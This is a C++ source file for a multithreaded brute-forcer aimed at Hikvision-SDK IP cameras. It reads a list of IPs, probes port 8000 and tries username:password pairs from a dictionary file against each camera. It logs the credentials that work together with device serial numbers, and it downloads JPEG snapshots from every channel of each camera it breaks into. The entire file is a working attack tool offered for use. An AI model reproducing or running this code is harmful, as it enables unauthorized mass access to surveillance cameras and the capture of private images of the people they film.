#include <memory>
#include <iostream>
#include "../include/HCNetSDK.h"
#include "fstream"
#include <arpa/inet.h>
#include <vector>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <thread>
#include <mutex>
#include <sys/stat.h>
#include <fcntl.h>
#include <zconf.h>

bool checkTCP(std::string ip, int port);

bool validateIpAddress(const std::string &ipAddress);

void brute(std::string ip);

void bruteforce();

void loadPictures(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 device);

static std::mutex take_sync;
static std::vector<std::string> ips;

int port = 8000;
int threads_count = 500;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define MAGENTA "\033[35m"
#define BLUE    "\033[34m"

int main() {
    int a1;
    std::cout << GREEN << "Enter port: " << RESET;
    if (std::cin >> a1)
        port = a1;

    int a2;
    std::cout << GREEN << "Enter threads: " << RESET;
    if (std::cin >> a2)
        threads_count = a2;

    mkdir("./pictures", 0655);
    if (!NET_DVR_Init()) {
        std::cout << RESET << RED << "Error NET_DVR_Init" << RESET << std::endl;;
        return 0;
    }
    NET_DVR_SetConnectTime();
    NET_DVR_SetReconnect();

    std::ifstream filein("ips.txt");
    for (std::string line; std::getline(filein, line);) {
        ips.push_back(line);
    }

    //TODO: fix threads
    std::vector<std::thread> threads;
    for (int i = 0; i < threads_count; i++)
        threads.push_back(std::thread(bruteforce));

    for (int i = 0; i < threads_count; i++)
        threads[i].join();

    NET_DVR_Cleanup();
    return 0;
}

void bruteforce() {
    while (true) {
        std::string ip;
        take_sync.lock();
        if (!ips.empty()) {
            ip = ips.back();
            ips.pop_back();
        } else {
            take_sync.unlock();
            break;
        }
        take_sync.unlock();
        brute(ip);
    }
}

void brute(std::string ip) {
    if (!validateIpAddress(ip)) {
        std::cout << RED << ip << " is not ip address" << RESET << std::endl;
        return;
    } else {
        std::cout << BLUE << "Used " << ip << ":" << port << RESET << std::endl;
    }

    if (!checkTCP(ip, port)) {
        std::cout << RED << ip << ":" << port << " is not a camera" << RESET << std::endl;
        return;
    } else {
        std::cout << MAGENTA << "A camera was found at " << ip << ":" << port << RESET << std::endl;
    }

    const char *host = ip.c_str();
    std::ifstream filein1("dictionary.txt");
    for (std::string line1; std::getline(filein1, line1);) {
        std::replace(line1.begin(), line1.end(), ':', ' ');
        std::istringstream iss(line1);
        std::vector<std::string> result;
        std::copy(std::istream_iterator<std::string>(iss),
                  std::istream_iterator<std::string>(),
                  std::back_inserter(result));

        const char *login = result[0].c_str();
        const char *password = result[1].c_str();

        NET_DVR_DEVICEINFO_V30 deviceinfo_v30;
        int UserID;
        UserID = NET_DVR_Login_V30((char *) host, (const WORD) port, (char *) login, (char *) password,
                                   &deviceinfo_v30);

        std::cout << CYAN << "Trying " << login << ":" << password << " for " << ip << ":" << port << RESET
                  << std::endl;
        if (UserID != -1) {
            std::cout << GREEN << login << ":" << password << "@" << ip << ":" << port
                      << RESET << std::endl;
            std::ofstream outfile;
            outfile.open("output.txt", std::ios_base::app);
            outfile << deviceinfo_v30.sSerialNumber << "\t" << login << ":" << password << "@" << ip << ":" << port
                    << "\n";
            loadPictures(ip, UserID, deviceinfo_v30);
            NET_DVR_Logout(UserID);
            return;
        }
    }
}

void loadPictures(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 deviceinfo_v30) {
    for (int channel = (int) deviceinfo_v30.byStartChan;
         channel < (int) deviceinfo_v30.byChanNum + (int) deviceinfo_v30.byStartChan; channel++) {
        std::string filename = "./pictures/" + ip + "_" + std::to_string(port) + "_" + std::to_string(channel) + ".jpg";
        NET_DVR_JPEGPARA params = {0};
        params.wPicQuality = 2;
        params.wPicSize = 0;
        if (NET_DVR_CaptureJPEGPicture((LONG) user_id, channel, &params, (char *) filename.c_str())) {
            chmod(filename.c_str(), 0655);
            std::cout << YELLOW << "Getting a photo (channel " << channel << ") from the camera " << ip << ":"
                      << port << "..."
                      << RESET << std::endl;
        }
    }
}

bool validateIpAddress(const std::string &ipAddress) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress.c_str(), &(sa.sin_addr));
    return result != 0;
}

bool checkTCP(std::string ip, int port) {
    struct sockaddr_in address;
    short int sock;
    fd_set fdset;
    struct timeval tv;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip.c_str());
    address.sin_port = htons((uint16_t) port);

    sock = (short) socket(AF_INET, SOCK_STREAM, 0);
    fcntl(sock, F_SETFL, O_NONBLOCK);

    connect(sock, (struct sockaddr *) &address, sizeof(address));

    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    tv.tv_sec = 3;
    tv.tv_usec = 0;

    if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
        int err;
        socklen_t len = sizeof err;
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
        close(sock);
        return err == 0;
    }
    return false;
}